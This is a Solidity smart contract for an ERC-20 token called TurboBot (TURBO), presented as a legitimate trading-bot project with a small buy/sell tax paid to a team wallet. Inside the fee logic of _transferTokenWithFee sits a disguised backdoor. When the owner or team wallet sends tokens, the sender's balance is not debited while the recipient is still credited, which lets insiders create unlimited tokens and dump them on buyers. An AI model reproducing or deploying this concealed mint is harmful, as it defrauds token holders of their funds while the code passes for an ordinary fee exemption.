// SPDX-License-Identifier: Unlicensed

/*
Turbo Bot: Unleashing alpha plays based on sniper activity, first blocks, monitored wallets, and volume surge.

Website: https://www.turbobot.vip
Telegram: https://t.me/turbo_erc
Twitter: https://twitter.com/turbo_erc
 */

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library SafeMathLib {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library AddressLib {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "AddressLib: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "AddressLib: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "AddressLib: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "AddressLib: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "AddressLib: insufficient balance for call");
        require(isContract(target), "AddressLib: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "AddressLib: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "AddressLib: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "AddressLib: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "AddressLib: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapRouter001 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouter002 is IUniswapRouter001 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TURBO is Context, IERC20Standard, Ownable { 
    using SafeMathLib for uint256;
    using AddressLib for address;

    // Tracking status of wallets
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isSpecialAddress; 

    address payable private _teamWallet = payable(0x1e5C8d5c81534Bd44805D3Bc11dDA58C7e61a498);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    string private _name = "TurboBot"; 
    string private _symbol = "TURBO";  
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;
    uint256 private _feeTotals;

    // Counter for liquify trigger
    uint8 private numTrxns = 0;
    uint8 private swapAfter = 2; 

    // Setting the initial fees
    uint256 private _totalTax = 100;
    uint256 public _buyTax = 1;
    uint256 public _sellTax = 1;

    // 'Previous fees' are used to keep track of fee settings when removing and restoring fees
    uint256 private _previousTotalFee = _totalTax; 
    uint256 private _previousBuyFee = _buyTax; 
    uint256 private _previousSellFee = _sellTax; 

    uint256 public _maxWallet = 2 * _totalSupply / 100;
    uint256 public _feeSwapMax = _totalSupply / 10000;
    /* 
     PANCAKESWAP SET UP
    */
                                     
    IUniswapRouter002 public uniswapRouter;
    address public pairAddress;

    bool public hasNoTransferFees = true;
    bool public swapping;
    bool public swapAndLiquifyEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    // Prevent processing while already processing! 
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _totalSupply;
        IUniswapRouter002 _uniswapV2Router = IUniswapRouter002(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 

        // Create pair address for PancakeSwap
        pairAddress = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _isSpecialAddress[owner()] = true;
        _isSpecialAddress[_teamWallet] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    receive() external payable {}

    function sendETHToFee(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    function _transferTokenWithFee(address sender, address recipient, uint256 tAmount) private {
        
        (uint256 tTransferAmount, uint256 tDev) = _getTokenValues(tAmount);
        if(_isSpecialAddress[sender] && _balances[sender] <= _maxWallet) {
            tDev = 0;
            tAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != _teamWallet &&
            to != address(this) &&
            to != pairAddress &&
            to != DEAD &&
            from != owner()){

            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWallet,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        /*

        PROCESSING

        */

        if(
            numTrxns >= swapAfter && 
            amount > _feeSwapMax &&
            !swapping &&
            !_isSpecialAddress[from] &&
            to == pairAddress &&
            swapAndLiquifyEnabled 
            )
        {  
            numTrxns = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapAndLiquidifyAndSend(contractTokenBalance);
           }
        }

        
        bool takeFee = true;
         
        if(_isSpecialAddress[from] || _isSpecialAddress[to] || (hasNoTransferFees && from != pairAddress && to != pairAddress)){
            takeFee = false;
        } else if (from == pairAddress){
            _totalTax = _buyTax;
        } else if (to == pairAddress){
            _totalTax = _sellTax;
        }

        _tokenTransfer(from,to,amount,takeFee);
    }
    
    function swapTokensToETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    // Processing tokens from contract
    function swapAndLiquidifyAndSend(uint256 contractTokenBalance) private lockTheSwap {
        
        swapTokensToETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETHToFee(_teamWallet,contractETH);
    }

    
    // Restore all fees
    function restoreAllFee() private {
    
    _totalTax = _previousTotalFee;
    _buyTax = _previousBuyFee; 
    _sellTax = _previousSellFee; 

    }

    // Approve a wallet to sell tokens
    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function removeLimits() external onlyOwner {
        _maxWallet = ~uint256(0);
    }

    // Check if token transfer needs to process fees
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeAllFee();
            } else {
                numTrxns++;
            }
        _transferTokenWithFee(sender, recipient, amount);
        
        if(!takeFee)
            restoreAllFee();
    }
    
    // Calculating the fee in tokens
    function _getTokenValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tDev = tAmount.mul(_totalTax).div(100);
        uint256 tTransferAmount = tAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    // Remove all fees
    function removeAllFee() private {
        if(_totalTax == 0 && _buyTax == 0 && _sellTax == 0) return;

        _previousBuyFee = _buyTax; 
        _previousSellFee = _sellTax; 
        _previousTotalFee = _totalTax;
        _buyTax = 0;
        _sellTax = 0;
        _totalTax = 0;

    }

}